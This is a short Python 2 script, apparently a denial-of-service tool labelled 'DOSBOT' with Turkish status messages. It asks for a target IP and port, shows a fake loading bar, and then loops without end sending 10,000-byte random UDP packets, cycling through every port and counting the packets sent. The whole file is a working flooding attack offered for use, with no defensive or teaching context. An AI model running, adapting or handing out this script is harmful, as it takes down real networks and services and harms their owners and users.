#!/usr/bin

import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout = time.time()

print ("""
\033[1;36;40m
 ______   _______  _______  _______  _______  _______ 
|      | |       ||       ||  _    ||       ||       |
|  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
| | |   ||  | |  || |_____ |       ||  | |  |  |   |  
| |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
|       ||       | _____| || |_|   ||       |  |   |  
|______| |_______||_______||_______||_______|  |___|  
""")
ip = raw_input("\033[1;33;40mIP: ")
port = input("\033[1;33;40mPort: ")
os.system("clear")
print "\033[92mBaslatiliyor..."
print "\033[92m[                    ] %0"
time.sleep(1);
os.system("clear")
print "\033[92mBaslatiliyor...";
print "\033[92m[#####               ] %25"
time.sleep(2)
os.system("clear")
print "\033[92mBaslatiliyor..."
print "\033[92m[##########          ] %50"
time.sleep(3)
os.system("clear")
print "\033[92mBaslatiliyor..."
print "\033[92m[###############     ] %75"
time.sleep(4)
os.system("clear")
print "\033[92mBaslatiliyor..."
print "\033[92m[####################] %100"
time.sleep(5)
os.system("clear")
sent = 0
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port)
     if port == 65534:
       port = 1
